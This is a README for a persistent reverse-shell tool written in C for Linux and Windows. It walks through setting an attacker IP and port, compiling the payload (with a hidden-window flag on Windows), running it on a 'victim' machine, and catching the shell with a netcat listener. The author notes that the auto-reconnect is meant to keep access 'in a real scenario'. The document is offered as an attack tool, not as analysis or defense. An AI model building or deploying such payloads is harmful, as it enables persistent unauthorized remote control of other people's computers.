# Reverse Shell Pro Max (Project_RSPM)

Read more about it in descreption or down below at last...

---

## Project Structure

The repository is structured as follows:


- **Project_RSPM_UNIX**: Contains C code designed to work on **Linux** systems.
- **Project_RSPM_WIN**: Contains C code designed to work on **Windows** systems.

---

## Features

- **Persistent Connection**: Continuously sends connection requests every second until successful.
- **Automatic Reconnection**: If the connection drops, the reverse shell payload automatically attempts to reconnect.
- **Target Specific IP and Port**: Easily change the IP and port where the reverse shell connects.
- **Works on Linux and Windows**: Separate codebases for each platform, with instructions for compiling and running.

---

## Installation and Usage

### 1. **Linux**

#### Step 1: Modify IP and Port
- Open the C file (`reverse_shell_6th_try_somehow_working.c`) located in the **Project_RSPM_UNIX** folder.
- Modify the `IP` and `PORT` to match the attacker's machine IP and desired port.

    ```c
    #define IP "192.168.100.215" // Replace with your attacker's IP
    #define PORT 4444            // Replace with your desired port
    ```

#### Step 2: Compile the C Code
- Compile the C code using `gcc`:

    ```bash
    gcc -o reverse_shell reverse_shell_6th_try_somehow_working.c
    ```

#### Step 3: Run the Payload
- Run the compiled reverse shell executable on the victim machine:

    ```bash
    ./reverse_shell
    ```

#### Step 4: Listen for Connections
- On your attacker's machine, use `nc` or another listening tool to catch the reverse shell connection:

    ```bash
    nc -lvnp 4444
    ```

---

### 2. **Windows**

#### Step 1: Modify IP and Port
- Open the C file (`reverse_shell_3rd_try_somehow_working.c`) located in the **Project_RSPM_WIN** folder.
- Modify the `IP` and `PORT` to match the attacker's machine IP and desired port.

    ```c
    #define IP "192.168.100.215" // Replace with your attacker's IP
    #define PORT 4444            // Replace with your desired port
    ```

#### Step 2: Install MinGW
- Install MinGW for compiling C code on Windows. If you don't have it installed, use the following command:

    ```bash
    sudo apt install mingw-w64
    ```

#### Step 3: Compile the C Code for Windows
- Compile the C file using the MinGW cross-compiler:

    ```bash
    x86_64-w64-mingw32-gcc reverse_shell_3rd_try_somehow_working.c -o reverse_shell.exe -lws2_32 -mwindows
    ```

#### Step 4: Run the Payload
- Run the compiled executable on the victim’s Windows machine:

    ```bash
    ./reverse_shell.exe
    ```

#### Step 5: Listen for Connections
- On the attacker's machine, listen for the reverse shell connection:

    ```bash
    nc -lvnp 4444
    ```

---

## Contributors

Feel free to open an issue or submit a pull request for improvements or new features. Contributions are welcome!

---

## Incomplete...

This project is incomplete and i made it as i am just a starter to code in c and its somehow working but hope some experienced c programmer will modify it or contribute here...

## ScriptKiddy -> TheGreen
Just random thought came to my mind while using msfvenom payload that if we are disconnected mistakenly, then we have to re-run the payload on the victim's machine. In testing, it's fine, but in a real scenario, it's simply not possible to re-run the payload or something like that situation may occur. I thought about this and I don't know if something like this is already available on GitHub or somewhere on the internet, but this repo is just a ScriptKiddy thought and made so that after running it once, we can connect to it whenever we want. If we are connected, it doesn't send the connection request, and if disconnected, it starts sending the connection request every second and loop...
